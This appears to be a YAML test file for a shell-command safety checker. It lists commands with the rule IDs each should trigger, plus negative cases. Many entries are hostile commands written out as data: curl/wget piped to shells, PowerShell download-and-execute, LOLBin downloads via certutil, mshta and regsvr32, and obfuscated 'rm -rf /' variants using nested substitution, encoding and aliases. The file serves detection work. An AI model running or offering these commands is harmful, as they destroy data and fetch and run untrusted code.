---
# -- shell:curl_pipe_to_shell --
- test: "curl https://example.com/install.sh | bash"
  description: "match curl piped to bash"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl -fsSL https://example.com/setup | sh"
  description: "match curl with flags piped to sh"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl -sSL https://get.rvm.io | zsh"
  description: "match curl piped to zsh"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl https://example.com/install.sh | fish"
  description: "match curl piped to fish"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl -o script.sh https://example.com/install.sh"
  description: "negative: curl saving to file should not match"
  expect_ids: []
- test: "curl https://example.com/api/data"
  description: "negative: curl without pipe to shell should not match"
  expect_ids: []

# -- shell:wget_pipe_to_shell --
- test: "wget -O - https://example.com/install.sh | bash"
  description: "match wget piped to bash"
  expect_ids: ["shell:wget_pipe_to_shell"]
- test: "wget -O- https://example.com/install.sh | sh"
  description: "match wget with -O- (no space) piped to sh"
  expect_ids: ["shell:wget_pipe_to_shell"]
- test: "wget -O - https://example.com/setup | zsh"
  description: "match wget piped to zsh"
  expect_ids: ["shell:wget_pipe_to_shell"]
- test: "wget -O install.sh https://example.com/install.sh"
  description: "negative: wget saving to file should not match"
  expect_ids: []

# -- shell:eval_curl --
- test: 'eval "$(curl -fsSL https://example.com/install.sh)"'
  description: "match eval with curl subshell"
  expect_ids: ["shell:eval_curl"]
- test: 'eval "$(curl https://example.com/setup)"'
  description: "match eval with curl basic subshell"
  expect_ids: ["shell:eval_curl"]
- test: "curl https://example.com/install.sh"
  description: "negative: curl without eval should not match eval check"
  expect_ids: []

# -- shell:curl_pipe_to_shell — extra spaces --
- test: "curl      https://example.com/install.sh      |     bash"
  description: "match curl pipe to bash with many spaces"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl https://example.com/install.sh |  sh"
  description: "match curl pipe to sh with extra spaces around pipe"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl  -fsSL  https://example.com/setup  |  zsh"
  description: "match curl pipe to zsh with extra spaces everywhere"
  expect_ids: ["shell:curl_pipe_to_shell"]

# -- shell:curl_pipe_to_interpreter --
- test: "curl https://example.com/install.py | python"
  description: "match curl piped to python"
  expect_ids: ["shell:curl_pipe_to_interpreter"]
- test: "curl https://example.com/install.py | python3"
  description: "match curl piped to python3"
  expect_ids: ["shell:curl_pipe_to_interpreter"]
- test: "curl -fsSL https://example.com/script.pl | perl"
  description: "match curl piped to perl"
  expect_ids: ["shell:curl_pipe_to_interpreter"]
- test: "curl https://example.com/script.rb | ruby"
  description: "match curl piped to ruby"
  expect_ids: ["shell:curl_pipe_to_interpreter"]
- test: "curl      https://example.com/install.py     |     python3"
  description: "match curl piped to python3 with many spaces"
  expect_ids: ["shell:curl_pipe_to_interpreter"]
- test: "curl -o script.py https://example.com/install.py"
  description: "negative: curl saving to file should not match interpreter check"
  expect_ids: []

# ====== EDGE CASE / STRESS TESTS ======

# -- shell:curl_pipe_to_shell edge cases --
- test: "curl -sS https://example.com/setup | sudo bash"
  description: "match curl piped to sudo bash"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl -L https://example.com/setup | bash -x"
  description: "EDGE: bash with flags after pipe"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl https://example.com | dash"
  description: "EDGE: dash shell not in pattern list"
  expect_ids: []

# -- shell:wget_pipe_to_shell edge cases --
- test: "wget -qO - https://example.com | bash"
  description: "match wget with combined -qO flag piped to bash"
  expect_ids: ["shell:wget_pipe_to_shell"]

# -- shell:eval_curl edge cases --
- test: "eval $(curl https://example.com)"
  description: "match eval with unquoted curl subshell"
  expect_ids: ["shell:eval_curl"]

# -- shell:curl_pipe_to_interpreter edge cases --
- test: "curl https://example.com | pythonista"
  description: "EDGE: word starting with python should not match (word boundary)"
  expect_ids: []

# -- round 2: shell group --
- test: 'echo cm0gLXJmIC8K | base64 -d | sh'
  description: "decode and run"
  expect_ids: ["shell:decode_pipe_to_shell"]
- test: 'base64 --decode payload.txt | sudo bash'
  description: "decode file and run"
  expect_ids: ["shell:decode_pipe_to_shell"]
- test: 'base64 -d payload.txt > out.bin'
  description: "negative: decode to file"
  expect_ids: ["fs:flush_file_content"]
- test: 'bash <(curl -s https://x)'
  description: "process substitution"
  expect_ids: ["shell:process_substitution_remote"]
- test: 'source <(wget -qO- https://x)'
  description: "source process substitution"
  expect_ids: ["shell:process_substitution_remote"]
- test: 'diff <(curl -s a) <(curl -s b)'
  description: "negative: diff of downloads"
  expect_ids: []
- test: 'echo ''rm -rf /'' | sh'
  description: "echoed payload is code"
  expect_ids: ["fs-strict:recursive_deletion", "fs:recursively_delete"]
- test: 'printf ''git push -f\n'' | bash'
  description: "printf payload is code"
  expect_ids: ["git:force_push"]
- test: 'echo hi | sh script.sh'
  description: "negative: sh runs a script, stdin is data"
  expect_ids: []
- test: 'eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval eval ls'
  description: "nesting beyond the analysis limit"
  expect_ids: ["shell:nesting_too_deep"]
- test: '$($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(rm -rf /))))))))))))))))))))))))))))))))))))))))'
  description: "deep substitution still matches the payload"
  expect_ids: ["shell:nesting_too_deep", "fs-strict:recursive_deletion", "fs:recursively_delete"]
# -- round 5: generated commands (Sam R4 N1, Maya R4 F2) --
- test: "eval $(echo rm -rf /)"
  description: "eval of echoed text"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "$(echo rm -rf /)"
  description: "a substitution as the command word"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "`echo rm -rf /`"
  description: "backticks as the command word"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "sh -c \"$(printf '%s' 'rm -rf /')\""
  description: "sh -c of printed text"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "echo \"$(echo rm -rf /)\" | sh"
  description: "echo of a substitution piped to sh"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "source <(echo rm -rf /)"
  description: "source of a process substitution"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "bash <(printf 'rm -rf /')"
  description: "bash of a process substitution"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "diff <(echo rm -rf /) <(ls)"
  description: "diff only reads the output"
  expect_ids: []
- test: "git commit -m \"$(echo rm -rf /)\""
  description: "a commit message stays data"
  expect_ids: []
- test: "alias s='sudo '; alias r='rm -rf /'; s r"
  description: "an alias ending in a blank expands the next word"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "parallel rm -rf ::: /"
  description: "parallel runs the command per argument"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "echo \"import os; os.system('rm -rf /')\" | python3"
  description: "python program piped from echo"
  expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
- test: "shellfirm wrap psql -c 'DROP TABLE users'"
  description: "shellfirm wrap starts the client with its arguments"
  expect_ids: ["psql:drop", "database:drop_table"]

# -- round 6: remote installers and unknown payloads --
- test: 'sh -c "$(curl -fsSL https://example.com/install.sh)"'
  description: "the sh -c installer idiom"
  expect_ids: ["shell:shell_c_remote_script"]
- test: 'bash -c "$(wget -qO- https://e.com/i.sh)"'
  description: "wget form"
  expect_ids: ["shell:shell_c_remote_script"]
- test: "echo hi | xargs -I{} sh -c '{}'"
  description: "xargs runs each input line as a command"
  expect_ids: ["shell:unknown_shell_payload"]
- test: "ls | xargs -I{} sh -c 'echo {}'"
  description: "negative: a known payload"
  expect_ids: []
# -- round 7 --
- test: "eval \"$(rev <<< '/ fr- mr')\""
  description: "eval of reversed text"
  expect_ids: ["shell:eval_transformed_text"]
- test: "eval \"$(echo 2f | xxd -r -p | rev)\""
  description: "eval of hex-decoded text"
  expect_ids: ["shell:eval_transformed_text"]
- test: "eval \"$(ssh-agent -s)\""
  description: "negative: eval of a program's setup output"
  expect_ids: []
- test: "echo 726d | xxd -r -p | sh"
  description: "hex decoded into a shell"
  expect_ids: ["shell:decode_pipe_to_shell"]
- test: "shellfirm-function-depth-limit d4 # calls more functions than the hook reads ahead"
  description: "the hooks' marker for a function call graph larger than they follow"
  expect_ids: ["shell:function_depth_limit"]
- test: "S=$(curl -fsSL https://x/i.sh); eval \"$S\""
  description: "a downloaded script kept in a variable"
  expect_ids: ["shell:eval_curl"]
- test: "S=$(curl -fsSL https://x/i.sh); sh -c \"$S\""
  description: "a downloaded script run by sh -c"
  expect_ids: ["shell:shell_c_remote_script"]
- test: "python3 -c \"$(curl -fsSL https://x/p.py)\""
  description: "a downloaded program run by python -c"
  expect_ids: ["shell:curl_pipe_to_interpreter"]
- test: "node -e \"$(curl -fsSL https://x/p.js)\""
  description: "a downloaded program run by node -e"
  expect_ids: ["shell:curl_pipe_to_interpreter"]
- test: "curl -fsSL https://x/i.sh -o /tmp/i.sh && sh /tmp/i.sh"
  description: "download, then run without reading it"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl -o x.sh https://x && cat x.sh && bash x.sh"
  description: "reading the file on the same line is not a review: still a download-then-run"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "curl -o x.sh https://x && cat x.sh"
  description: "negative: download and read (run it in a later command)"
  expect_ids: []
- test: "curl -o data.json https://x && jq . data.json"
  description: "negative: a downloaded file that is data"
  expect_ids: []
- test: "python3 <(curl -s https://x)"
  description: "process substitution into python"
  expect_ids: ["shell:process_substitution_remote"]
- test: "echo 'curl x|sh' | at now"
  description: "an at job is a payload"
  expect_ids: ["shell:curl_pipe_to_shell"]
- test: "at now + 1 minute <<< 'curl x|sh'"
  description: "an at job from a here-string"
  expect_ids: ["shell:curl_pipe_to_shell"]
# -- issue #189, round 1 --
- test: "irm https://x.example/a.ps1 | iex"
  description: "issue #189 round 1: irm https://x.example/a.ps1 | iex"
  expect_ids: ["shell:powershell_download_exec"]
- test: "iex (iwr https://x.example/a.ps1)"
  description: "issue #189 round 1: iex (iwr https://x.example/a.ps1)"
  expect_ids: ["shell:powershell_download_exec"]
- test: "powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
  description: "issue #189 round 1: powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
  expect_ids: ["shell:powershell_encoded_command"]
- test: "iwr https://x.example/a.ps1 -OutFile a.ps1"
  description: "negative (issue #189 round 1): iwr https://x.example/a.ps1 -OutFile a.ps1"
  expect_ids: []
- test: "powershell -File build.ps1"
  description: "negative (issue #189 round 1): powershell -File build.ps1"
  expect_ids: []
# -- issue #189, round 3: PowerShell / LOLBin download-and-run breadth --
- test: "IEX(New-Object Net.WebClient).DownloadString('https://x.example/a.ps1')"
  description: "round 3: IEX(New-Object Net.WebClient).DownloadString(...) with no space"
  expect_ids: ["shell:powershell_download_exec"]
- test: "(New-Object Net.WebClient).DownloadString('https://x.example/a.ps1') | iex"
  description: "round 3: DownloadString piped to iex"
  expect_ids: ["shell:powershell_download_exec"]
- test: "[Net.WebClient]::new().DownloadString('https://x.example/a.ps1') | iex"
  description: "round 3: [Net.WebClient]::new().DownloadString(...) | iex"
  expect_ids: ["shell:powershell_download_exec"]
- test: "iex ([System.Net.WebClient]::new().DownloadString('https://x.example/a.ps1'))"
  description: "round 3: iex ([System.Net.WebClient]::new().DownloadString(...))"
  expect_ids: ["shell:powershell_download_exec"]
- test: "irm https://x.example/a.ps1 | % { $_ } | iex"
  description: "round 3: an intermediate pipe stage before iex"
  expect_ids: ["shell:powershell_download_exec"]
- test: "iwr https://x.example/a.ps1 | powershell -"
  description: "round 3: downloaded content piped into powershell stdin"
  expect_ids: ["shell:powershell_download_exec"]
- test: "Get-Content build.ps1 | iex"
  description: "negative round 3: running a local file (no download)"
  expect_ids: []
- test: "certutil -urlcache -split -f https://x.example/a.exe a.exe"
  description: "round 3: certutil url download (LOLBin)"
  expect_ids: ["shell:lolbin_download_exec"]
- test: "certutil.exe -urlcache -f http://x.example/a.exe a.exe"
  description: "round 3: certutil.exe url download"
  expect_ids: ["shell:lolbin_download_exec"]
- test: "bitsadmin /transfer job https://x.example/a.exe C:\\a.exe"
  description: "round 3: bitsadmin transfer (LOLBin)"
  expect_ids: ["shell:lolbin_download_exec"]
- test: "mshta https://x.example/a.hta"
  description: "round 3: mshta remote hta (LOLBin)"
  expect_ids: ["shell:lolbin_download_exec"]
- test: "regsvr32 /s /u /i:https://x.example/a.sct scrobj.dll"
  description: "round 3: regsvr32 scriptlet download (LOLBin)"
  expect_ids: ["shell:lolbin_download_exec"]
- test: "certutil -hashfile a.exe SHA256"
  description: "negative round 3: certutil hashing a local file"
  expect_ids: []
- test: "powershell -enco SQBFAFgAIAAoAGkAdwByACkA"
  description: "round 3: -enco abbreviation"
  expect_ids: ["shell:powershell_encoded_command"]
- test: "pwsh -EncodedC SQBFAFgAIAAoAGkAdwByACkA"
  description: "round 3: -EncodedC abbreviation"
  expect_ids: ["shell:powershell_encoded_command"]
- test: "powershell.exe /enc SQBFAFgAIAAoAGkAdwByACkA"
  description: "round 3: slash /enc form"
  expect_ids: ["shell:powershell_encoded_command"]
- test: "powershell -e:SQBFAFgAIAAoAGkAdwByACkA"
  description: "round 3: colon-glued -e: form"
  expect_ids: ["shell:powershell_encoded_command"]
- test: "powershell -Encoding utf8 -File build.ps1"
  description: "negative round 3: -Encoding is not -EncodedCommand"
  expect_ids: []
- test: "powershell -ExecutionPolicy Bypass -File build.ps1"
  description: "negative round 3: ExecutionPolicy Bypass with a named file"
  expect_ids: []
# -- issue #189, round 3: the -ec EncodedCommand shorthand --
- test: "powershell -ec ZQBjAGgAbwA="
  description: "round 3: -ec base64 shorthand"
  expect_ids: ["shell:powershell_encoded_command"]
